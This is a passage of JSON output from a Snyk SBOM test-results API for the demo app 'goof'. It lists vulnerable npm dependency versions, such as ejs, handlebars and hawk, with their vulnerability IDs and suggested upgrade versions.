          {
            "type": "remedies",
            "id": "snyk@1.290.2:SNYK-JS-SNYK-3111871"
          },
          {
            "type": "remedies",
            "id": "st@0.2.4:npm:st:20140206"
          },
          {
            "type": "remedies",
            "id": "st@0.2.4:npm:st:20171013"
          },
          {
            "type": "remedies",
            "id": "symbol@0.2.3:snyk:lic:npm:symbol:MPL-2.0"
          },
          {
            "type": "remedies",
            "id": "tough-cookie@2.3.4:SNYK-JS-TOUGHCOOKIE-5672873"
          },
          {
            "type": "remedies",
            "id": "tough-cookie@3.0.1:SNYK-JS-TOUGHCOOKIE-5672873"
          },
          {
            "type": "remedies",
            "id": "tunnel-agent@0.4.3:npm:tunnel-agent:20170305"
          },
          {
            "type": "remedies",
            "id": "uglify-js@2.6.2:SNYK-JS-UGLIFYJS-1727251"
          },
          {
            "type": "remedies",
            "id": "underscore@1.9.1:SNYK-JS-UNDERSCORE-1080984"
          },
          {
            "type": "remedies",
            "id": "word-wrap@1.2.3:SNYK-JS-WORDWRAP-3149973"
          },
          {
            "type": "remedies",
            "id": "xml2js@0.4.19:SNYK-JS-XML2JS-5414874"
          },
          {
            "type": "remedies",
            "id": "xml2js@0.4.23:SNYK-JS-XML2JS-5414874"
          },
          {
            "type": "remedies",
            "id": "y18n@3.2.1:SNYK-JS-Y18N-1021887"
          },
          {
            "type": "remedies",
            "id": "yargs-parser@2.4.0:SNYK-JS-YARGSPARSER-560381"
          }
        ]
      }
    }
  },
  "jsonapi": {
    "version": "1.0"
  },
  "links": {
    "self": "/rest/orgs/704e5b0a-b5d6-4a0c-af54-586013c7ce7a/sbom_tests/2fa52f42-4490-4431-a1e7-298174d970a4/results?version=2024-07-10~beta"
  },
  "included": [
    {
      "type": "remedies",
      "id": "@snyk/snyk-cocoapods-plugin@2.0.1:SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "@snyk/snyk-cocoapods-plugin",
                "version": "2.0.1",
                "new_version": "2.5.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "@snyk/snyk-cocoapods-plugin@2.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-SNYKSNYKCOCOAPODSPLUGIN-3038625"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "acorn@5.7.1:SNYK-JS-ACORN-559469",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "acorn",
                "version": "5.7.1",
                "new_version": "5.7.4"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "acorn@5.7.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ACORN-559469"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "adm-zip@0.4.11:SNYK-JS-ADMZIP-1065796",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "adm-zip",
                "version": "0.4.11",
                "new_version": "0.5.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "adm-zip@0.4.11"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ADMZIP-1065796"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ansi-regex@2.1.1:SNYK-JS-ANSIREGEX-1583908",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ansi-regex",
                "version": "2.1.1",
                "new_version": "3.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ansi-regex@2.1.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ANSIREGEX-1583908"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ansi-regex@3.0.0:SNYK-JS-ANSIREGEX-1583908",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ansi-regex",
                "version": "3.0.0",
                "new_version": "3.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ansi-regex@3.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ANSIREGEX-1583908"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ansi-regex@4.1.0:SNYK-JS-ANSIREGEX-1583908",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ansi-regex",
                "version": "4.1.0",
                "new_version": "4.1.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ansi-regex@4.1.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ANSIREGEX-1583908"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "bl@0.9.5:SNYK-JS-BL-608877",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "bl",
                "version": "0.9.5",
                "new_version": "1.2.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "bl@0.9.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-BL-608877"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "bl@3.0.0:SNYK-JS-BL-608877",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "bl",
                "version": "3.0.0",
                "new_version": "3.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "bl@3.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-BL-608877"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "brace-expansion@1.1.4:npm:brace-expansion:20170302",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "brace-expansion",
                "version": "1.1.4",
                "new_version": "1.1.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "brace-expansion@1.1.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:brace-expansion:20170302"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "braces@1.8.5:SNYK-JS-BRACES-6838727",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "braces",
                "version": "1.8.5",
                "new_version": "3.0.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "braces@1.8.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-BRACES-6838727"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "braces@1.8.5:npm:braces:20180219",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "braces",
                "version": "1.8.5",
                "new_version": "2.3.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "braces@1.8.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:braces:20180219"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "cli@0.6.6:npm:cli:20160615",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "cli",
                "version": "0.6.6",
                "new_version": "1.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "cli@0.6.6"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:cli:20160615"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "debug@2.2.0:npm:debug:20170905",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "debug",
                "version": "2.2.0",
                "new_version": "2.6.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "debug@2.2.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:debug:20170905"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "debug@3.2.6:npm:debug:20170905",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "debug",
                "version": "3.2.6",
                "new_version": "3.2.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "debug@3.2.6"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:debug:20170905"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "debug@4.1.1:npm:debug:20170905",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "debug",
                "version": "4.1.1",
                "new_version": "4.3.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "debug@4.1.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:debug:20170905"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "dicer@0.3.0:SNYK-JS-DICER-2311764",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "dicer@0.3.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-DICER-2311764"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "dustjs-linkedin@2.6.0:SNYK-JS-DUSTJSLINKEDIN-1089257",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "dustjs-linkedin",
                "version": "2.6.0",
                "new_version": "3.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "dustjs-linkedin@2.6.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-DUSTJSLINKEDIN-1089257"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@0.8.8:SNYK-JS-EJS-1049328",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "0.8.8",
                "new_version": "3.1.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@0.8.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-1049328"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@0.8.8:SNYK-JS-EJS-2803307",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "0.8.8",
                "new_version": "3.1.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@0.8.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-2803307"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@0.8.8:SNYK-JS-EJS-6689533",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "0.8.8",
                "new_version": "3.1.10"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@0.8.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-6689533"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@0.8.8:npm:ejs:20161128",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "0.8.8",
                "new_version": "2.5.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@0.8.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161128"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@0.8.8:npm:ejs:20161130",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "0.8.8",
                "new_version": "2.5.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@0.8.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161130"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@0.8.8:npm:ejs:20161130-1",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "0.8.8",
                "new_version": "2.5.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@0.8.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161130-1"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@1.0.0:SNYK-JS-EJS-1049328",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "1.0.0",
                "new_version": "3.1.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@1.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-1049328"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@1.0.0:SNYK-JS-EJS-2803307",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "1.0.0",
                "new_version": "3.1.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@1.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-2803307"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@1.0.0:SNYK-JS-EJS-6689533",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "1.0.0",
                "new_version": "3.1.10"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@1.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EJS-6689533"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@1.0.0:npm:ejs:20161128",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "1.0.0",
                "new_version": "2.5.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@1.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161128"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@1.0.0:npm:ejs:20161130",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "1.0.0",
                "new_version": "2.5.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@1.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161130"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ejs@1.0.0:npm:ejs:20161130-1",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ejs",
                "version": "1.0.0",
                "new_version": "2.5.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ejs@1.0.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:ejs:20161130-1"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-2635697",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "express-fileupload@0.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-2635697"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-2635946",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "express-fileupload@0.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-2635946"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-473997",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "express-fileupload",
                "version": "0.0.5",
                "new_version": "1.1.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "express-fileupload@0.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-473997"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "express-fileupload@0.0.5:SNYK-JS-EXPRESSFILEUPLOAD-595969",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "express-fileupload",
                "version": "0.0.5",
                "new_version": "1.1.10"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "express-fileupload@0.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESSFILEUPLOAD-595969"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "express@4.12.4:SNYK-JS-EXPRESS-6474509",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "express",
                "version": "4.12.4",
                "new_version": "4.19.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "express@4.12.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-EXPRESS-6474509"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "fresh@0.2.4:npm:fresh:20170908",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "fresh",
                "version": "0.2.4",
                "new_version": "0.5.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "fresh@0.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:fresh:20170908"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "goof@1.0.1:snyk:lic:npm:goof:GPL-2.0",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "goof@1.0.1"
          }
        },
        "license_issue": {
          "data": {
            "type": "license_issues",
            "id": "snyk:lic:npm:goof:GPL-2.0"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "got@6.7.1:SNYK-JS-GOT-2932019",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "got",
                "version": "6.7.1",
                "new_version": "11.8.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "got@6.7.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-GOT-2932019"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-1056767",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.7.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-1056767"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-1279029",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.7.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-1279029"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-173692",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.0.13"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-173692"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-174183",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.0.14"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-174183"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-469063",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.3.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-469063"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-480388",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.4.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-480388"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-534478",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.5.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-534478"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-534988",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.5.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-534988"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "handlebars@4.0.5:SNYK-JS-HANDLEBARS-567742",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "handlebars",
                "version": "4.0.5",
                "new_version": "4.6.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "handlebars@4.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HANDLEBARS-567742"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hawk@1.1.1:SNYK-JS-HAWK-2808852",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hawk",
                "version": "1.1.1",
                "new_version": "9.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hawk@1.1.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HAWK-2808852"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hawk@1.1.1:SNYK-JS-HAWK-6969142",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hawk@1.1.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HAWK-6969142"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hawk@1.1.1:npm:hawk:20160119",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hawk",
                "version": "1.1.1",
                "new_version": "3.1.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hawk@1.1.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:hawk:20160119"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hawk@3.1.3:SNYK-JS-HAWK-2808852",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hawk",
                "version": "3.1.3",
                "new_version": "9.0.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hawk@3.1.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HAWK-2808852"
          }
        }
      }
    },
    {
      "type": "remedies",
